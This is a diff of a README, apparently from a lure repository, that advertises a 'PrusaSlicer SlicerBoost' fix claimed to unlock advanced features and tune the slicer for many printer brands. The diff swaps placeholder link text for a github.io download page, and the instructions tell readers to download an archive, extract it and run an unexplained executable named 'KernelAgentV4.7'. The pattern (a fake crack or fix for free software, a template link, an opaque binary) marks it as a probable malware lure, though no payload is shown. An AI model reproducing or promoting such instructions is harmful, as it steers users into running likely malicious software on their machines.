@@ -2,13 +2,15 @@
 
 This tool unlocks advanced features and fixes profile/slicing issues in PrusaSlicer, optimizing it for all printer types — from Prusa to Voron and Ender — using `KernelAgentV4.7`.
 
-[![Download PrusaSlicer Fix](https://img.shields.io/badge/Download-PrusaSlicer_SlicerBoost-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PrusaSlicer Fix](https://img.shields.io/badge/Download-PrusaSlicer_SlicerBoost-blueviolet)](https://prusaslicer-advanced-3d-slicing.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://prusaslicer-advanced-3d-slicing.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PrusaFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will auto-detect your installed PrusaSlicer version and apply optimized configurations  
